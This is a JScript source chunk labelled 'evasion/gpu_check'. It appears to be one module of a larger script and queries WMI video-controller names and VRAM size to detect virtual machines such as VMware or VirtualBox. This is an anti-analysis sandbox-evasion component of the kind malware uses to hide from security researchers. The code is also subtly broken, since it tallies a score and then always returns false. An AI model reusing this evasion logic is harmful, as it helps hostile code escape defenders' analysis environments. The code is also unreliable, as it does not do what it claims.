// chunk: evasion/gpu_check
// depends: core/run_cmd
// provides: check_gpu
// format: jscript
// note: WMI Win32_VideoController GPU name check. Virtual GPU adapters like
//       "Microsoft Basic Display" or "VMware SVGA" indicate VM environment.

function check_gpu() {
    var score = 0;
    try {
        var loc = new ActiveXObject("WbemScripting.SWbemLocator");
        var svc = loc.ConnectServer(".", "root\\cimv2");
        var gpus = svc.ExecQuery("SELECT Name, AdapterRAM FROM Win32_VideoController");
        var en = new Enumerator(gpus);
        var vmGpus = ["microsoft basic", "vmware svga", "virtualbox", "qxl", "cirrus", "red hat"];
        while (!en.atEnd()) {
            var name = (en.item().Name || "").toLowerCase();
            for (var i = 0; i < vmGpus.length; i++) {
                if (name.indexOf(vmGpus[i]) >= 0) score++;
            }
            var ram = parseInt(en.item().AdapterRAM) || 0;
            if (ram > 0 && ram < 134217728) score++; /* < 128MB VRAM */
            en.moveNext();
        }
    } catch(e) {}
    return false;
}
